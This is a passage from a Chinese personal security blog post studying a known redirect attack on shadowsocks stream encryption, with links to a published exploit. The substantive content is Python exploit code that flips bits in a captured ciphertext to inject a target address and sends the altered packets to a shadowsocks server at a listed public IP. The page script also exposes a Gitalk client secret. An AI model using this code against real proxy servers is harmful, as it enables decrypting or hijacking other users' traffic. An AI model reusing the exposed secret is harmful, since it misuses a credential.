<span class="keyword">return</span> c</span><br><span class="line"><span class="comment">#c is a capture http packet.</span></span><br><span class="line">c=<span class="string">'b338f754455478c1fdb1dc11f300050ce303ea8d9bdfdd2afa64cf257184c0e79f1b10f528abaa'</span></span><br><span class="line">c=c.decode(<span class="string">'hex'</span>)</span><br><span class="line">c=up(c)</span><br><span class="line">c1=<span class="string">'8a6db90928015d006b6f1998dcc71e19a25e201ca2a2560dc99ccfa48e8d300723af80bbbf2ecfb154c3fa67c05450874c279efe990fe85a516e1d25a94cf4848997a8ecfb0b339f7e50f805fb79ab97c370fab07751da5e72059fd28a5977635400e7d87d1dd69ca5bfc6af3f9b41bd07062365ad4cf1feef7eeb5d79ec0f1c6b1f2c62489cd319fa1138dd271aea22747463ae3e1aa5e2aea6ec519715431cd6b94ca1677878eb3ab5436b04f505b4aeb73f46bb8a665d4bc9d7d6eff180fabbd8e1f052876f48bfa48ba63c2941eaec73f72593572d8d1125e2b0fbd327d99c1e54921fe70007a0fcfdc174cba65ba1984f44f8f78bd372e0f8aa09c65e0189e587b1875e791a583830d02e5d25067e1932743cc889dd5efe73fa3b034668cb7970cf344a557e82bc3bfdb669943586cb14a5c0baded64eb4388b5df920db87006ac2341c8cb40a6c4b4cfff6de0851e6dee1527556a2cbfff423051856120e1533d53cefa468577dbda680f4a29fab203dc1b4072ae0bd48810b5ec3d9830ecad310c7ee63bb6c10aa1a9e8718b2b6b1a651a8f65649604258b1ed508928c4259c35496c9eeb6c924891101212c1f73d254d843322863f00af45743b674eb34c1a28abc74e7373d6376ebeff346ec7e1b8698a2cb812a64b00c24ada0df99d76241916c093e0d03bbf6ffff8463db25b52e75c2dbcc5a80ccc203d052eec6b9a3043dc5667cf3fbaeebe8d2d20c767b77b51c64bc73a706f16f6a2b851e24d99b1ec66bfec'</span></span><br><span class="line">c=c+c1.decode(<span class="string">'hex'</span>)</span><br><span class="line">prefix_http=<span class="string">'HTTP/1.'</span></span><br><span class="line">prefix_https_send=<span class="string">'\x16\x03\x01\x02\x00\x01\x00'</span></span><br><span class="line"><span class="comment">#targetIP='\x01\xc0\xa8\x01\x03\x12\x12'# malicous target IP address: 192.168.1.3:4626</span></span><br><span class="line"><span class="comment">#targetIP='\x01\x23\xbd\xa0\x6b\x1f\x90'</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">y=c[<span class="number">16</span>:<span class="number">16</span>+<span class="number">7</span>]</span><br><span class="line">serverip=<span class="string">"13.70.25.143"</span></span><br><span class="line">serverport=<span class="number">8080</span></span><br><span class="line">targetIP=<span class="string">'\x01\x2f\x34\xab\x43\x12\x12'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">60</span>,<span class="number">120</span>,<span class="number">1</span>):</span><br><span class="line">	prefix_https_recv=<span class="string">'\x16\x03\x03\x01'</span>+chr(i)+<span class="string">'\x02\x00'</span></span><br><span class="line">	x=xor(prefix_https_recv,targetIP)</span><br><span class="line">	z=xor(x,y)</span><br><span class="line">	cipertext=c[<span class="number">0</span>:<span class="number">16</span>]+z+c[<span class="number">16</span>+<span class="number">7</span>:]</span><br><span class="line">	obj = socket.socket()</span><br><span class="line">	obj.connect((serverip,serverport))<span class="comment"># ss-server is running on 192.168.1.2:8899</span></span><br><span class="line">	<span class="keyword">print</span> (i)</span><br><span class="line">	obj.send(cipertext)<span class="comment"># send the payload to construct a redirect tunnel</span></span><br><span class="line">	time.sleep(<span class="number">0.2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>):</span><br><span class="line">        prefix_https_recv=<span class="string">'\x16\x03\x03\x00'</span>+chr(i)+<span class="string">'\x02\x00'</span></span><br><span class="line">	x=xor(prefix_https_recv,targetIP)</span><br><span class="line">	z=xor(x,y)</span><br><span class="line">	cipertext=c[<span class="number">0</span>:<span class="number">16</span>]+z+c[<span class="number">16</span>+<span class="number">7</span>:]</span><br><span class="line">	obj = socket.socket()</span><br><span class="line">	obj.connect((serverip,serverport))<span class="comment"># ss-server is running on 192.168.1.2:8899</span></span><br><span class="line">	<span class="keyword">print</span> (i)</span><br><span class="line">	obj.send(cipertext)<span class="comment"># send the payload to construct a redirect tunnel</span></span><br><span class="line">	time.sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="更新-漏洞复现"><a href="#更新-漏洞复现" class="headerlink" title="更新-漏洞复现"></a>更新-漏洞复现</h2><p>参考博文：<a href="https://www.leadroyal.cn/?p=1036" target="_blank" rel="noopener">https://www.leadroyal.cn/?p=1036</a><br>这个作者提供了<a href="https://github.com/LeadroyaL/ss-redirect-vuln-exp" target="_blank" rel="noopener">exp</a>，讲得挺详细，以后有兴趣了跟着操作一遍。</p>

    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>Dana Shaw
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://dana5haw.com/posts/Shadow_Love_Why.html" title="重定向攻击shadowsocks流加密">https://dana5haw.com/posts/Shadow_Love_Why.html</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <div>   
         
        <div>     
             
    <div style="text-align:center;color: #ccc;font-size:14px;">
        -------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------
    </div>     
     
</div>   
     
      </div>

      <footer class="post-footer">
          
          <div class="post-tags">
              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> 漏洞学习</a>
              <a href="/tags/shadowsocks%E6%B5%81%E5%8A%A0%E5%AF%86/" rel="tag"><i class="fa fa-tag"></i> shadowsocks流加密</a>
              <a href="/tags/%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/" rel="tag"><i class="fa fa-tag"></i> 重定向攻击</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/posts/Selenium_Web_Automation.html" rel="prev" title="selenium模块实现web自动化测试">
      <i class="fa fa-chevron-left"></i> selenium模块实现web自动化测试
    </a></div>
      <div class="post-nav-item">
    <a href="/posts/TroubleShoot_Pycharm_Selenium.html" rel="next" title="问题解决-pycharm报错找不到selenium模块">
      问题解决-pycharm报错找不到selenium模块 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  

  </div>


          </div>
          
    <div class="comments" id="gitalk-container"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let activeClass = CONFIG.comments.activeClass;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#正文"><span class="nav-number">2.</span> <span class="nav-text">正文</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#创建定向通道的代码"><span class="nav-number">3.</span> <span class="nav-text">创建定向通道的代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#更新-漏洞复现"><span class="nav-number">4.</span> <span class="nav-text">更新-漏洞复现</span></a></li></ol></div>
      </div>
        <div id="">
	  <canvas id="canvas" style="width:60%;">
	    </div>
	      <script type="text/javascript" src="/js/canvas-dance-time.js"></script>
      <!--/noindex-->


      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Dana Shaw"
      src="/./images/photo.jpg">
  <p class="site-author-name" itemprop="name">Dana Shaw</p>
  <div class="site-description" itemprop="description">连尘埃也想收藏</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">214</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">76</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">354</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/DanaShaw" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;DanaShaw" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:danaxkj@gmail.com" title="E-Mail → mailto:danaxkj@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://weibo.com/u/5742631593" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5742631593" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
      </span>
      <span class="links-of-author-item">
        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
      </span>
  </div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title">
      <i class="fa fa-fw fa-link"></i>
      友情链接
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://whale3070.github.io/" title="https:&#x2F;&#x2F;whale3070.github.io&#x2F;" rel="noopener" target="_blank">windows提权学习</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://www.ghtwf01.cn/" title="https:&#x2F;&#x2F;www.ghtwf01.cn&#x2F;" rel="noopener" target="_blank">渗透实战学习</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="http://shuaiguoer.com/" title="http:&#x2F;&#x2F;shuaiguoer.com&#x2F;" rel="noopener" target="_blank">shell学习</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://xxs2.cn/" title="https:&#x2F;&#x2F;xxs2.cn&#x2F;" rel="noopener" target="_blank">安全工具学习</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://www.liaoxuefeng.com/" title="https:&#x2F;&#x2F;www.liaoxuefeng.com&#x2F;" rel="noopener" target="_blank">编程入门学习</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<span id="timeDate">载入天数...</span>
<span id="times">载入时分秒...</span>
<script>
    var now = new Date();
        function createtime() {
	        var grt= new Date("01/07/2020 21:49:45");//此处修改你的建站时间或者网站上线时间
		        now.setTime(now.getTime()+250);
			        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
				        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
					        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
						        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
							        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
								        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
									        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
										        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
											    }
											    setInterval("createtime()",250);
											    </script>

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Dana Shaw</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    <span title="站点总字数">482k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">7:18</span>
</div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

<script src="/js/bookmark.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">

<script>
NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
    var gitalk = new Gitalk({
      clientID: '2dc357f83ef2282cb7cb',
      clientSecret: '64ad793540c649b1f67bcbd2fc4c648b631176c5',
      repo: 'DanaShaw.github.io',
      owner: 'DanaShaw',
      admin: ['DanaShaw'],
      id: '8754958f08749ae7985d2d622480d381',
        language: 'zh-CN',
      distractionFreeMode: true
    });
    gitalk.render('gitalk-container');
  }, window.Gitalk);
});
</script>

  
  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
  
  
   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
   <script type="text/javascript" src="/js/fireworks.js"></script>

</body>
</html>
